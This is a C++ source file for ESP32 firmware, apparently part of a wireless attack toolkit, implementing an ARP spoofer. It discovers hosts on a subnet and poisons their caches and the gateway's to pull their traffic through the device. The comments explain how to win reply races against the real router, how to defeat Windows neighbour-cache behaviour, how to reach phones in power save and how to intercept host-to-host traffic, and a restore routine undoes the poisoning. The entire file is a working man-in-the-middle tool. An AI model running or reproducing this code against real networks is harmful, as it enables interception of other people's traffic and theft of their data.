#include "utils/network/ArpSpoofer.h"

#include <WiFi.h>
#include <esp_wifi.h>

// esp_wifi_internal.h is not shipped with the Arduino framework, but the symbol
// is exported from libnet80211.a (verified with nm). Declaring it here is the
// same approach the project already takes to reach the patched raw-TX path.
extern "C" esp_err_t esp_wifi_internal_tx(wifi_interface_t ifx, void* buffer, uint16_t len);

static const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
static const uint8_t kZeroMac[6]   = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

// Ethernet II + ARP for IPv4 is exactly 42 bytes.
static constexpr uint16_t ARP_FRAME_LEN = ArpSpoofer::FRAME_LEN;

// ── Lifecycle ───────────────────────────────────────────────────────────────

bool ArpSpoofer::begin() {
  end();

  if (WiFi.status() != WL_CONNECTED) return false;

  _selfIp = (uint32_t)WiFi.localIP();
  _gwIp   = (uint32_t)WiFi.gatewayIP();
  const uint32_t mask = (uint32_t)WiFi.subnetMask();

  if (_selfIp == 0 || _gwIp == 0 || mask == 0) return false;
  WiFi.macAddress(_selfMac);

  // IPAddress casts to little-endian host order on ESP32; work in host order
  // throughout and only swap when serialising into the frame.
  const uint32_t selfH = ntohl(_selfIp);
  const uint32_t maskH = ntohl(mask);
  const uint32_t netH  = selfH & maskH;
  const uint32_t size  = ~maskH;            // host bits

  if (size < 2) return false;               // /31 or /32 — nothing to sweep

  _netH      = netH;
  _maskH     = maskH;
  _netBase   = netH + 1;                    // skip the network address
  _hostCount = size - 1;                    // skip the broadcast address
  if (_hostCount > (uint32_t)MAX_TARGETS) _hostCount = MAX_TARGETS;
  // Targeted mode: the sweep walks the explicit list instead of the subnet.
  if (_explicitCount) _hostCount = _explicitCount;

  _sweepIdx  = 0;
  _sweepDone = false;
  _poisonIdx = 0;
  _count     = 0;
  _gwKnown   = false;
  _sent      = 0;
  _txFail    = 0;
  _resolveIp    = 0;
  _resolveMs    = 0;
  _poisonRound  = 0;
  _retryMs      = 0;
  _probeRetried = 0;
  _probeLost    = 0;
  _probeDropped = 0;
  _gwAnnounce   = 0;
  memset(_retry, 0, sizeof(_retry));
  memset(_targets, 0, sizeof(_targets));
  _running   = true;
  return true;
}

void ArpSpoofer::end() {
  _running   = false;
  _count     = 0;
  _sweepIdx  = 0;
  _sweepDone = false;
  _poisonIdx = 0;
  _gwKnown   = false;
  memset(_retry, 0, sizeof(_retry));
}

// ── Frame construction ──────────────────────────────────────────────────────

void ArpSpoofer::_buildArp(uint8_t* f, uint16_t opcode,
                           const uint8_t* dstMac, const uint8_t* srcMac,
                           const uint8_t* senderMac, uint32_t senderIp,
                           const uint8_t* targetMac, uint32_t targetIp) {
  memcpy(f + 0, dstMac, 6);
  memcpy(f + 6, srcMac, 6);
  f[12] = 0x08; f[13] = 0x06;          // EtherType ARP

  f[14] = 0x00; f[15] = 0x01;          // hardware type: Ethernet
  f[16] = 0x08; f[17] = 0x00;          // protocol type: IPv4
  f[18] = 6;                           // hardware size
  f[19] = 4;                           // protocol size
  f[20] = (uint8_t)(opcode >> 8);
  f[21] = (uint8_t)(opcode & 0xFF);

  memcpy(f + 22, senderMac, 6);
  memcpy(f + 28, &senderIp, 4);        // already network byte order
  memcpy(f + 32, targetMac, 6);
  memcpy(f + 38, &targetIp, 4);
}

// One attempt. Retrying in a tight loop never helps: the TX buffers are
// allocated from the heap and are still exhausted microseconds later, and the
// attempt steals capacity from the relay, whose frames are the victim's actual
// traffic. Callers that cannot afford a loss use _sendArpReliable(), which
// spreads its retries over milliseconds instead.
bool ArpSpoofer::_txArp(const uint8_t* frame) {
  if (esp_wifi_internal_tx(WIFI_IF_STA, (void*)frame, ARP_FRAME_LEN) == ESP_OK) {
    _sent++;
    return true;
  }
  _txFail++;
  return false;
}

void ArpSpoofer::_sendArp(uint16_t opcode,
                          const uint8_t* dstMac, const uint8_t* srcMac,
                          const uint8_t* senderMac, uint32_t senderIp,
                          const uint8_t* targetMac, uint32_t targetIp) {
  uint8_t f[ARP_FRAME_LEN];
  _buildArp(f, opcode, dstMac, srcMac, senderMac, senderIp, targetMac, targetIp);
  _txArp(f);
}

// Sends now and again a few tens of milliseconds later, whether or not the
// first one was accepted. The delayed copy is not a retry — it is how the race
// is won. When a victim flushes its entry and broadcasts "who has the gateway",
// we and the real router both answer, and the cache keeps whichever reply
// arrives last. One answer means a coin flip against the router on every
// refresh; the deferred copy lands after it and takes the entry back.
void ArpSpoofer::_sendArpReliable(uint16_t opcode,
                                  const uint8_t* dstMac, const uint8_t* srcMac,
                                  const uint8_t* senderMac, uint32_t senderIp,
                                  const uint8_t* targetMac, uint32_t targetIp) {
  uint8_t f[ARP_FRAME_LEN];
  _buildArp(f, opcode, dstMac, srcMac, senderMac, senderIp, targetMac, targetIp);
  _txArp(f);
  _queueRetry(f);
}

// Runs on the WiFi task. Fills the slot before publishing it so the main loop
// never sees a half-written frame.
void ArpSpoofer::_queueRetry(const uint8_t* frame) {
  for (int i = 0; i < RETRY_SLOTS; i++) {
    if (_retry[i].used) continue;
    memcpy(_retry[i].frame, frame, ARP_FRAME_LEN);
    _retry[i].tries = 0;
    _retry[i].dueMs = millis() + RETRY_DELAY_MS;
    __asm__ __volatile__("" ::: "memory");
    _retry[i].used = true;
    return;
  }
  // Counted apart from a TX failure. This is not the driver refusing frames —
  // it is more hosts asking than the queue holds, which needs more slots or a
  // faster drain, not more retries.
  _probeDropped++;
}

// Runs on the main loop, one frame per call. A slot goes out once it is due,
// and two sends are never closer together than RETRY_GAP_MS so a queue that
// filled up drains steadily instead of as one burst into the TX pool.
void ArpSpoofer::flushRetries() {
  if (!_running) return;

  const uint32_t now = millis();
  if (now - _retryMs < RETRY_GAP_MS) return;

  for (int i = 0; i < RETRY_SLOTS; i++) {
    if (!_retry[i].used) continue;
    // Signed compare so the wrap of millis() is not read as "overdue".
    if ((int32_t)(now - _retry[i].dueMs) < 0) continue;
    _retryMs = now;

    if (_txArp(_retry[i].frame)) {
      _probeRetried++;
      _retry[i].used = false;
    } else if (++_retry[i].tries >= RETRY_TRIES) {
      _probeLost++;
      _retry[i].used = false;
    } else {
      // Refused. Back off before trying again — the TX pool will not have
      // recovered by the next loop iteration.
      _retry[i].dueMs = now + RETRY_GAP_MS * 4;
    }
    return;
  }
}

// ── Discovery ───────────────────────────────────────────────────────────────

void ArpSpoofer::sweepStep() {
  if (!_running || _sweepDone) return;

  for (int i = 0; i < SWEEP_BATCH && _sweepIdx < _hostCount; i++, _sweepIdx++) {
    const uint32_t ipN = _explicitCount ? _explicit[_sweepIdx]
                                        : htonl(_netBase + _sweepIdx);
    if (ipN == _selfIp) continue;      // no point asking about ourselves

    // "Who has <ip>? Tell <us>" — replies come back unicast and are picked up
    // by observe() through the relay hook.
    _sendArp(1, kBroadcast, _selfMac, _selfMac, _selfIp, kZeroMac, ipN);
  }

  if (_sweepIdx >= _hostCount) _sweepDone = true;
}

void ArpSpoofer::setTargets(const uint32_t* ipsNetworkOrder, uint8_t count) {
  _explicitCount = count > MAX_EXPLICIT ? MAX_EXPLICIT : count;
  for (uint8_t i = 0; i < _explicitCount; ++i) _explicit[i] = ipsNetworkOrder[i];
}

void ArpSpoofer::observe(const uint8_t* eth, uint16_t len) {
  if (!_running || len < ARP_FRAME_LEN) return;
  if (eth[12] != 0x08 || eth[13] != 0x06) return;         // not ARP
  if (eth[14] != 0x00 || eth[15] != 0x01) return;         // not Ethernet
  if (eth[16] != 0x08 || eth[17] != 0x00) return;         // not IPv4
  if (eth[18] != 6 || eth[19] != 4) return;

  const uint16_t opcode = ((uint16_t)eth[20] << 8) | eth[21];
  if (opcode != 1 && opcode != 2) return;

  uint32_t senderIp, targetIp;
  memcpy(&senderIp, eth + 28, 4);
  memcpy(&targetIp, eth + 38, 4);
  const uint8_t* senderMac = eth + 22;

  if (senderIp == 0 || senderIp == _selfIp) return;
  // Ignore anything claiming our own MAC — that is our poison echoing back.
  if (memcmp(senderMac, _selfMac, 6) == 0) return;

  // ── Learn ────────────────────────────────────────────────────────────────
  if (senderIp == _gwIp) {
    memcpy(_gwMac, senderMac, 6);
    _gwKnown = true;

    // A group-addressed ARP from the gateway is the router announcing where it
    // really lives, and every host on the segment has just corrected its cache.
    // Waiting for the next scheduled round would leave them all talking to the
    // real gateway in the meantime, so answer it straight away. Unicast replies
    // from the router are invisible to us — they go to the host that asked —
    // which is why the deferred copy in _sendArpReliable() carries the rest.
    if ((eth[0] & 0x01) != 0) {
      _gwAnnounce++;
      _poisonRound = POISON_BCAST_EVERY;      // next poisonStep() broadcasts
      uint8_t f[ARP_FRAME_LEN];
      _buildArp(f, 2, kBroadcast, _selfMac, _selfMac, _gwIp, kZeroMac, _gwIp);
      _txArp(f);
      _queueRetry(f);
    }
  } else {
    _add(senderIp, senderMac);
  }

  // ── Answer requests ──────────────────────────────────────────────────────
  // This is what makes the poisoning stick. Modern Windows (and anything else
  // following the RFC 4861 neighbour state machine) discards an unsolicited
  // reply while its entry is Reachable — it only relearns from the answer to
  // its own request. Racing that answer is far more effective than spamming
  // gratuitous replies, which is all the poison loop does.
  if (opcode != 1 || !_running) return;

  if (targetIp == _gwIp && targetIp != _selfIp) {
    // Someone is looking for the gateway — claim to be it. This is usually a
    // reachability probe on an entry we already own, and it is the only frame
    // that keeps the poison alive: an unsolicited reply leaves the entry stale,
    // so the victim keeps probing and falls back to the real gateway after a
    // few unanswered ones. Queued for retry rather than sent twice back to
    // back — two frames into an exhausted TX pool are two frames lost.
    _sendArpReliable(2, senderMac, _selfMac, _selfMac, _gwIp, senderMac, senderIp);
  } else if (_explicitCount && _isExplicit(targetIp) && targetIp != _selfIp) {
    // Targeted mode: a host is looking for one of the listed peers — claim to
    // be it. Without this, host-to-host poisoning dies on the first
    // reachability probe and the conversation bypasses us.
    _sendArpReliable(2, senderMac, _selfMac, _selfMac, targetIp, senderMac, senderIp);
  } else if (_gwKnown && senderIp == _gwIp && targetIp != _selfIp) {
    // The gateway is looking for a host — claim to be that host, so the return
    // path keeps flowing through us too. Same one-shot deal as above.
    _sendArpReliable(2, _gwMac, _selfMac, _selfMac, targetIp, _gwMac, _gwIp);
  }
}

void ArpSpoofer::requestResolve(uint32_t ip) {
  if (!_running || ip == 0 || ip == _selfIp || ip == _gwIp) return;
  if (_indexOf(ip) >= 0) return;

  // One request per address per second, and never more than five a second in
  // total. An unanswered address keeps arriving as long as the sender retries,
  // and turning that into a broadcast per frame would drown the segment.
  const uint32_t now = millis();
  if (now - _resolveMs < 200) return;
  if (ip == _resolveIp && now - _resolveMs < 1000) return;
  _resolveIp = ip;
  _resolveMs = now;

  _sendArp(1, kBroadcast, _selfMac, _selfMac, _selfIp, kZeroMac, ip);
}

void ArpSpoofer::observeIpv4(const uint8_t* srcMac, uint32_t srcIp) {
  if (!_running || srcIp == 0 || srcIp == _selfIp || srcIp == _gwIp) return;
  if (memcmp(srcMac, _selfMac, 6) == 0) return;
  // Frames relayed by the gateway carry its MAC but a remote source address —
  // adding those would fill the table with internet hosts.
  if (_gwKnown && memcmp(srcMac, _gwMac, 6) == 0) return;
  // Only local hosts can be poisoned.
  if ((ntohl(srcIp) & _maskH) != _netH) return;
  // Targeted mode: never learn hosts outside the explicit list.
  if (_explicitCount) {
    bool listed = false;
    for (uint8_t i = 0; i < _explicitCount; ++i) if (_explicit[i] == srcIp) { listed = true; break; }
    if (!listed) return;
  }

  _add(srcIp, srcMac);
}

void ArpSpoofer::_add(uint32_t ip, const uint8_t* mac) {
  const int idx = _indexOf(ip);
  if (idx >= 0) {
    memcpy(_targets[idx].mac, mac, 6);  // refresh — host may have changed NIC
    return;
  }
  if (_count >= MAX_TARGETS) return;
  _targets[_count].ip   = ip;
  _targets[_count].used = true;
  memcpy(_targets[_count].mac, mac, 6);
  _count++;
}

int ArpSpoofer::_indexOf(uint32_t ip) const {
  for (int i = 0; i < _count; i++) {
    if (_targets[i].used && _targets[i].ip == ip) return i;
  }
  return -1;
}

const ArpSpoofer::Target* ArpSpoofer::findByIp(uint32_t ip) const {
  const int i = _indexOf(ip);
  return (i >= 0) ? &_targets[i] : nullptr;
}

const ArpSpoofer::Target* ArpSpoofer::findByMac(const uint8_t* mac) const {
  for (int i = 0; i < _count; i++) {
    if (_targets[i].used && memcmp(_targets[i].mac, mac, 6) == 0) return &_targets[i];
  }
  return nullptr;
}

// ── Poisoning ───────────────────────────────────────────────────────────────

bool ArpSpoofer::_isExplicit(uint32_t ip) const {
  for (uint8_t i = 0; i < _explicitCount; i++)
    if (_explicit[i] == ip) return true;
  return false;
}

void ArpSpoofer::_poisonPeers() {
  // Each listed host is told every other listed host lives at our MAC, one
  // pair per call so we do not burst into the TX pool. This is what makes
  // host-to-host traffic flow through the relay. A pair where one side is the
  // gateway is poisoned too (its MAC comes from _gwMac), which diverts the
  // other target's internet traffic; that only happens when the user entered
  // the gateway as a target.
  const uint8_t pairs = _explicitCount * _explicitCount;
  for (uint8_t tries = 0; tries < pairs; tries++) {
    const uint8_t i = _peerIdx % _explicitCount;
    const uint8_t j = (_peerIdx / _explicitCount) % _explicitCount;
    _peerIdx++;
    if (i == j) continue;
    // Resolve each side's MAC: a normal target from the table, or the gateway
    // from _gwMac (the sweep never adds the gateway as a Target).
    const bool iGw = _explicit[i] == _gwIp, jGw = _explicit[j] == _gwIp;
    const Target* ti = iGw ? nullptr : findByIp(_explicit[i]);
    const Target* tj = jGw ? nullptr : findByIp(_explicit[j]);
    if ((!ti && !iGw) || (!tj && !jGw)) continue;
    if ((iGw || jGw) && !_gwKnown) continue;
    const uint8_t* iMac = iGw ? _gwMac : ti->mac;
    const uint8_t* jMac = jGw ? _gwMac : tj->mac;
    const uint32_t iIp  = _explicit[i], jIp = _explicit[j];
    // Tell i that j is at our MAC, and j that i is at our MAC.
    _sendArp(2, iMac, _selfMac, _selfMac, jIp, iMac, iIp);
    _sendArp(2, jMac, _selfMac, _selfMac, iIp, jMac, jIp);
    break;
  }
}

void ArpSpoofer::poisonStep() {
  if (!_running) return;

  // Peer poisoning does not need the gateway. With two or more explicit
  // targets this captures traffic between them even when neither is the
  // gateway.
  if (_explicitCount >= 2) _poisonPeers();

  if (!_gwKnown) return;

  // Broadcast claim for the gateway address. This reaches every host on the
  // segment, including ones the sweep never found — phones in WiFi power save
  // routinely ignore ARP requests, so discovery alone misses them entirely.
  // It only covers the victim→gateway direction; the return path still needs a
  // known target, which observeIpv4() supplies once the victim starts talking
  // through us.
  // Not every call: it recovers hosts that fell back to the real gateway, which
  // is worth doing regularly but not at the rate of the per-target frames.
  // Skipped in targeted mode: the broadcast would poison hosts that are not
  // on the explicit list.
  if (!_explicitCount && ++_poisonRound >= POISON_BCAST_EVERY) {
    _poisonRound = 0;
    _sendArp(2, kBroadcast, _selfMac, _selfMac, _gwIp, kZeroMac, _gwIp);
  }

  // Targeted mode confines capture to traffic *between* the chosen hosts, so it
  // does not poison each target against the gateway (that would divert all of
  // their internet traffic). Exception: if the gateway is itself one of the
  // targets, it is handled as an ordinary peer by _poisonPeers(), which then
  // does divert that target's internet traffic — shown as Tn(G) in the UI.
  if (_explicitCount) return;

  if (_count == 0) return;

  for (int n = 0; n < POISON_BATCH && _count > 0; n++) {
    if (_poisonIdx >= _count) _poisonIdx = 0;
    const Target& t = _targets[_poisonIdx];
    _poisonIdx++;
    if (!t.used) continue;

    // Victim: "the gateway is at our MAC".
    _sendArp(2, t.mac, _selfMac, _selfMac, _gwIp, t.mac, t.ip);
    // Gateway: "the victim is at our MAC" — needed for the return path.
    _sendArp(2, _gwMac, _selfMac, _selfMac, t.ip, _gwMac, _gwIp);
  }
}

void ArpSpoofer::restore() {
  if (!_gwKnown) return;

  // The Ethernet source stays our own MAC on every frame below. We are an
  // associated station: the driver builds the 802.11 header from this header
  // and encrypts with our pairwise key, so a frame claiming someone else's
  // address is one the AP cannot decrypt and simply discards — which used to
  // make the whole restore a silent no-op, leaving victims poisoned until their
  // cache aged out. The correction lives in the ARP sender fields, which is
  // what a cache actually keys on.

  // Broadcast the true gateway mapping first. The broadcast poison reaches
  // hosts that are not in the table, so a per-target restore alone would leave
  // them pointing at us with no way to correct them.
  for (int pass = 0; pass < 3; pass++) {
    _sendArp(2, kBroadcast, _selfMac, _gwMac, _gwIp, kZeroMac, _gwIp);
    delay(5);
  }

  // Two passes: ARP is unreliable and a lost restore leaves a host offline
  // until its cache ages out, which can be minutes.
  for (int pass = 0; pass < 2; pass++) {
    for (int i = 0; i < _count; i++) {
      const Target& t = _targets[i];
      if (!t.used) continue;
      _sendArp(2, t.mac, _selfMac, _gwMac, _gwIp, t.mac, t.ip);
      _sendArp(2, _gwMac, _selfMac, t.mac, t.ip, _gwMac, _gwIp);
      delay(2);
    }
  }

  // Undo peer poisoning: tell each explicit target the real MAC of the others.
  // Mirrors _poisonPeers(), including a pair where one side is the gateway (MAC
  // from _gwMac) — otherwise that victim would keep pointing at us until its
  // cache ages out, which can cut its internet for minutes.
  if (_explicitCount >= 2) {
    for (uint8_t i = 0; i < _explicitCount; i++) {
      for (uint8_t j = 0; j < _explicitCount; j++) {
        if (i == j) continue;
        const bool iGw = _explicit[i] == _gwIp, jGw = _explicit[j] == _gwIp;
        const Target* ti = iGw ? nullptr : findByIp(_explicit[i]);
        const Target* tj = jGw ? nullptr : findByIp(_explicit[j]);
        if ((!ti && !iGw) || (!tj && !jGw)) continue;
        if ((iGw || jGw) && !_gwKnown) continue;
        const uint8_t* iMac = iGw ? _gwMac : ti->mac;
        const uint8_t* jMac = jGw ? _gwMac : tj->mac;
        // Tell i the real MAC of j (sender = j's true MAC).
        _sendArp(2, iMac, _selfMac, jMac, _explicit[j], iMac, _explicit[i]);
        delay(2);
      }
    }
  }
}
